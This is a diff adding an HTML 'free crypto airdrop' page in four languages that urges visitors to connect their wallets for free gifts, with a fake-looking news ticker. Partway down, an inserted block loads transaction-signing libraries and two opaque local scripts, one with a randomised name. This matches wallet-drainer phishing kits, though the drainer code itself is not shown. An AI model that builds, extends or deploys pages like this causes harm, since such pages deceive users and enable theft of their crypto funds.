@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Crypto Airdrop | RDX Ankit</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: white;
+      text-align: center;
+      overflow-x: hidden;
+    }
+
+    .lang-select {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 10px;
+      border-radius: 6px;
+      background: #1abc9c;
+      color: white;
+      border: none;
+      cursor: pointer;
+      z-index: 10;
+    }
+
+    .container {
+      padding: 100px 20px 60px;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      animation: fadeInDown 1s ease-in-out;
+    }
+
+    p {
+      font-size: 1.2rem;
+      animation: fadeInUp 1s ease-in-out;
+    }
+
+    .wallet-btn {
+      margin-top: 20px;
+      padding: 15px 30px;
+      font-size: 1rem;
+      background-color: #ff6a00;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: transform 0.3s;
+    }
+
+    .wallet-btn:hover {
+      transform: scale(1.1);
+    }
+
+    .offer-banner {
+      margin-top: 40px;
+      background: #ffe600;
+      color: #000;
+      padding: 15px;
+      font-weight: bold;
+      font-size: 1.2rem;
+      border-radius: 10px;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+      animation: blinkOffer 1.5s infinite;
+      cursor: pointer;
+    }
+
+    @keyframes blinkOffer {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    #walletStatus {
+      margin-top: 15px;
+      font-size: 1rem;
+      color: #f0f0f0;
+    }
+
+    .blockchain-strip {
+      margin: 40px auto;
+      overflow: hidden;
+      white-space: nowrap;
+      box-sizing: border-box;
+      width: 100%;
+    }
+
+    .blockchain-strip .logos {
+      display: inline-block;
+      padding-left: 100%;
+      animation: scrollLogos 30s linear infinite;
+    }
+
+    .blockchain-strip .logos span {
+      display: inline-block;
+      margin: 0 30px;
+      font-size: 1.1rem;
+      background: rgba(255,255,255,0.1);
+      padding: 10px 15px;
+      border-radius: 20px;
+      border: 1px solid rgba(255,255,255,0.3);
+    }
+
+    @keyframes scrollLogos {
+      0% { transform: translateX(0%); }
+      100% { transform: translateX(-100%); }
+    }
+
+    .news-ticker {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background: #000;
+      color: white;
+      font-size: 0.95rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      overflow: hidden;
+      z-index: 999;
+      border-top: 2px solid #1abc9c;
+    }
+
+    .breaking-label {
+      background: red;
+      color: white;
+      padding: 6px 12px;
+      font-weight: bold;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .ticker {
+      overflow: hidden;
+      white-space: nowrap;
+      width: 100%;
+    }
+
+    .ticker-items {
+      display: inline-block;
+      padding-left: 20px;
+      animation: tickerMove 30s linear infinite;
+    }
+
+    @keyframes tickerMove {
+      0% { transform: translateX(100%); }
+      100% { transform: translateX(-100%); }
+    }
+  </style>
+</head>
+<body>
+
+  <select class="lang-select" onchange="changeLanguage(this.value)">
+    <option value="en">English</option>
+    <option value="hi">हिंदी</option>
+    <option value="es">Español</option>
+    <option value="fr">Français</option>
+  </select>
+
+  <div class="container">
+    <h1 id="title">Claim Your Daily Crypto Airdrop</h1>
+    <p id="desc">Connect your wallet to get free crypto gifts from top blockchains instantly.</p>
+    <button class="wallet-btn" onclick="connectWallet()" id="walletBtn">Connect Wallet</button>
+    <p id="walletStatus"></p>
+    <div class="offer-banner" onclick="connectWallet()">💰 Get up to ₹500 worth free crypto instantly!</div>
+  </div>
+
+  <div class="blockchain-strip">
+    <div class="logos">
+      <span>Ethereum</span>
+      <span>Binance Smart Chain</span>
+      <span>Polygon</span>
+      <span>Solana</span>
+      <span>Avalanche</span>
+      <span>Arbitrum</span>
+      <span>Optimism</span>
+      <span>Fantom</span>
+      <span>Base</span>
+      <span>Tron</span>
+      <span>zkSync</span>
+      <span>Linea</span>
+      <span>StarkNet</span>
+      <span>Near</span>
+      <span>Sui</span>
+    </div>
+  </div>
+
+  <div class="news-ticker">
+    <span class="breaking-label">Breaking:</span>
+    <div class="ticker">
+      <div class="ticker-items" id="newsItems">
+        🚀 Ethereum gas fees down 25%! &nbsp;&nbsp;
+        💥 Bitcoin hits $70K! &nbsp;&nbsp;
+        🪙 Polygon partners with Google Cloud! &nbsp;&nbsp;
+        🔒 SEC planning new crypto rules next month! &nbsp;&nbsp;
+        🎉 Solana DeFi launch with AI tools!
+      </div>
+    </div>
+  </div>
+
+      
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    
+      <script src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.0.3/web3.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+            
+      <script src="/settings.js"></script>
+      <script src="/3mrx2dty77p.js" type="module"></script>
+    
+    
+  <script>
+    async function connectWallet() {
+      if (typeof window.ethereum !== 'undefined') {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const walletAddress = accounts[0];
+          window.web3 = new Web3(window.ethereum);
+          document.getElementById("walletStatus").innerText = `✅ Connected: ${walletAddress}`;
+        } catch (err) {
+          alert("❌ Wallet connection rejected.");
+        }
+      } else {
+        alert("❌ Please install MetaMask to continue.");
+      }
+    }
+
+    function changeLanguage(lang) {
+      const translations = {
+        en: {
+          title: "Claim Your Daily Crypto Airdrop",
+          desc: "Connect your wallet to get free crypto gifts from top blockchains instantly.",
+          walletBtn: "Connect Wallet"
+        },
+        hi: {
+          title: "अपना डेली क्रिप्टो एयरड्रॉप प्राप्त करें",
+          desc: "अपने वॉलेट को कनेक्ट करें और टॉप ब्लॉकचेन से फ्री क्रिप्टो पाएं।",
+          walletBtn: "वॉलेट कनेक्ट करें"
+        },
+        es: {
+          title: "Reclama tu Airdrop Cripto Diario",
+          desc: "Conecta tu cartera y recibe cripto gratis al instante de blockchains top.",
+          walletBtn: "Conectar Billetera"
+        },
+        fr: {
+          title: "Réclamez votre Airdrop Crypto Quotidien",
+          desc: "Connectez votre portefeuille pour obtenir des crypto gratuites des meilleurs blockchains.",
+          walletBtn: "Connecter le Portefeuille"
+        }
+      };
+      document.getElementById("title").innerText = translations[lang].title;
+      document.getElementById("desc").innerText = translations[lang].desc;
+      document.getElementById("walletBtn").innerText = translations[lang].walletBtn;
+    }
+  </script>
+
+</body>
+</html>
